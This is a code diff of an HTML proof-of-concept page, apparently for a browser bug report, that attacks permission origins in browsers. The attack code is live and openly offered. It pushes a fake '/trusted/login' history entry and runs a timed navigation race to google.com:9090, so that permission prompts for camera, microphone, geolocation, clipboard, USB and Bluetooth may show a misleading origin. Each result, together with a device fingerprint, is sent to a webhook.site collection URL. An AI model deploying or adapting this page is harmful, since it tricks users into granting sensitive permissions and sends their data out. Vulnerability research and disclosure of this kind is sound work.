@@ -2,42 +2,183 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>POC Google Overlay</title>
+<title>Permission Origin Desync PoC Final</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body { font-family: Arial; text-align: center; margin-top: 50px; }
-button { padding: 12px 24px; font-size: 16px; }
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
+button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
+#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.notice{margin-top:14px;font-size:13px;color:#b00020}
 </style>
 </head>
+
 <body>
-<h2>POC: Google URL dengan overlay GitHub sementara</h2>
-<p>Klik tombol untuk mulai POC.</p>
-<button id="start">Start</button>
+
+<h2 style="margin-top:60px;">Permission Origin Confusion PoC Final</h2>
+<p>Attacker-controlled page</p>
+
+<button id="start">Start PoC</button>
+
+<div id="panel">
+  <h3>Request Permissions</h3>
+  <p>Observe origin shown in permission dialogs</p>
+  <button onclick="reqMotion()">🧭 Motion</button>
+  <button onclick="reqGeo()">📍 Geolocation</button>
+  <button onclick="reqCamera()">📷 Camera</button>
+  <button onclick="reqMic()">🎤 Microphone</button>
+  <button onclick="reqNotify()">🔔 Notifications</button>
+  <button onclick="reqClipboard()">📋 Clipboard</button>
+  <button onclick="reqBluetooth()">🟦 Bluetooth</button>
+  <button onclick="reqUSB()">🔌 USB</button>
+  <button onclick="reqMidi()">🎹 MIDI</button>
+  <p id="output">Result: -</p>
+  <div class="notice">Demo only — UI origin may not match JS origin</div>
+</div>
 
 <script>
-const startBtn = document.getElementById("start");
+/* ================= CONFIG ================= */
+const WEBHOOK = 'https://webhook.site/a43e7707-1ae8-4ac7-af3b-f188526c6b2c';
+const NAV_TARGET = 'https://google.com:9090';
 
-startBtn.onclick = function() {
-    // Step 1: redirect ke google.com
-    window.location.replace("https://google.com:0000");
+const panel  = document.getElementById('panel');
+const output = document.getElementById('output');
 
-    // Step 2: buat overlay sementara
-    const overlay = document.createElement('iframe');
-    overlay.src = "https://github.com";
-    overlay.style.position = "fixed";
-    overlay.style.top = 0;
-    overlay.style.left = 0;
-    overlay.style.width = "100%";
-    overlay.style.height = "100%";
-    overlay.style.border = "none";
-    overlay.id = "githubOverlay";
-    document.body.appendChild(overlay);
+/* ================= PASSIVE GET PROOF ================= */
+function sendProofGET(status){
+  let navType='na', navRedirects='na';
+  try{
+    const n = performance.getEntriesByType('navigation')[0];
+    if(n){ navType=n.type; navRedirects=n.redirectCount; }
+  }catch(e){}
 
-    // Step 3: hapus overlay setelah 7 detik
-    setTimeout(() => {
-        const o = document.getElementById("githubOverlay");
-        if(o) o.remove();
-    }, 7000);
+  const conn = navigator.connection || {};
+
+  const params = new URLSearchParams({
+    poc: 'permission-origin-desync',
+    permission: status,
+    attacker_origin: location.origin,
+    attacker_url: location.href,
+    doc_state: document.readyState,
+    visibility: document.visibilityState,
+    has_focus: document.hasFocus(),
+    history_len: history.length,
+    secure_ctx: window.isSecureContext,
+    protocol: location.protocol,
+    nav_target: NAV_TARGET,
+    nav_type: navType,
+    nav_redirects: navRedirects,
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen_res: screen.width+'x'+screen.height,
+    color_depth: screen.colorDepth,
+    device_memory: navigator.deviceMemory||'na',
+    cpu_cores: navigator.hardwareConcurrency||'na',
+    touch_points: navigator.maxTouchPoints,
+    cookie_enabled: navigator.cookieEnabled,
+    dnt: navigator.doNotTrack||'na',
+    connection_type: conn.effectiveType||'na',
+    save_data: conn.saveData||false,
+    perf_now_ms: Math.round(performance.now()),
+    ts: Date.now(),
+    ua: navigator.userAgent,
+    lang: navigator.language
+  });
+
+  const img = new Image();
+  img.src = WEBHOOK+'?'+params.toString()+'&poc_version=final&demo_intent=origin_confusion&marker=END';
+}
+
+/* ================= PERMISSION FUNCTIONS ================= */
+
+function reqMotion(){
+  if(typeof DeviceMotionEvent?.requestPermission === 'function'){
+    DeviceMotionEvent.requestPermission()
+      .then(res=>{ output.textContent='Motion: '+res; sendProofGET('motion_'+res); })
+      .catch(()=>{ output.textContent='Motion denied'; sendProofGET('motion_denied'); });
+  }else{ output.textContent='Motion unsupported'; sendProofGET('motion_unsupported'); }
+}
+
+function reqGeo(){
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(
+      ()=>{ output.textContent='Geo: granted'; sendProofGET('geo_granted'); },
+      ()=>{ output.textContent='Geo: denied'; sendProofGET('geo_denied'); }
+    );
+  }else{ output.textContent='Geo unsupported'; sendProofGET('geo_unsupported'); }
+}
+
+function reqCamera(){
+  if(navigator.mediaDevices){
+    navigator.mediaDevices.getUserMedia({video:true})
+      .then(()=>{ output.textContent='Camera granted'; sendProofGET('camera_granted'); })
+      .catch(()=>{ output.textContent='Camera denied'; sendProofGET('camera_denied'); });
+  }else{ sendProofGET('camera_unsupported'); }
+}
+
+function reqMic(){
+  if(navigator.mediaDevices){
+    navigator.mediaDevices.getUserMedia({audio:true})
+      .then(()=>{ output.textContent='Mic granted'; sendProofGET('mic_granted'); })
+      .catch(()=>{ output.textContent='Mic denied'; sendProofGET('mic_denied'); });
+  }else{ sendProofGET('mic_unsupported'); }
+}
+
+function reqNotify(){
+  if("Notification" in window){
+    Notification.requestPermission().then(res=>{
+      output.textContent='Notification: '+res; sendProofGET('notif_'+res);
+    });
+  }else{ sendProofGET('notif_unsupported'); }
+}
+
+async function reqClipboard(){
+  try{
+    await navigator.clipboard.readText();
+    output.textContent='Clipboard granted'; sendProofGET('clipboard_granted');
+  }catch{
+    output.textContent='Clipboard denied'; sendProofGET('clipboard_denied');
+  }
+}
+
+async function reqBluetooth(){
+  if(navigator.bluetooth){
+    try{ await navigator.bluetooth.requestDevice({acceptAllDevices:true});
+      output.textContent='Bluetooth granted'; sendProofGET('bluetooth_granted');
+    }catch{ output.textContent='Bluetooth denied'; sendProofGET('bluetooth_denied'); }
+  }else{ sendProofGET('bluetooth_unsupported'); }
+}
+
+async function reqUSB(){
+  if(navigator.usb){
+    try{ await navigator.usb.requestDevice({filters:[]});
+      output.textContent='USB granted'; sendProofGET('usb_granted');
+    }catch{ output.textContent='USB denied'; sendProofGET('usb_denied'); }
+  }else{ sendProofGET('usb_unsupported'); }
+}
+
+function reqMidi(){
+  if(navigator.requestMIDIAccess){
+    navigator.requestMIDIAccess()
+      .then(()=>{ output.textContent='MIDI granted'; sendProofGET('midi_granted'); })
+      .catch(()=>{ output.textContent='MIDI denied'; sendProofGET('midi_denied'); });
+  }else{ sendProofGET('midi_unsupported'); }
+}
+
+/* ================= ATTACK LOGIC ================= */
+document.getElementById('start').onclick = () => {
+  history.pushState({}, '', '/trusted/login');
+  panel.style.display = 'block';
 };
+
+/* Navigation race */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(()=>{ requestAnimationFrame(()=>{
+    setTimeout(()=>{
+      location.href='https://google.com:9090/#https://google.com:9090';
+    },80);
+  }); });
+});
 </script>
+
 </body>
 </html>
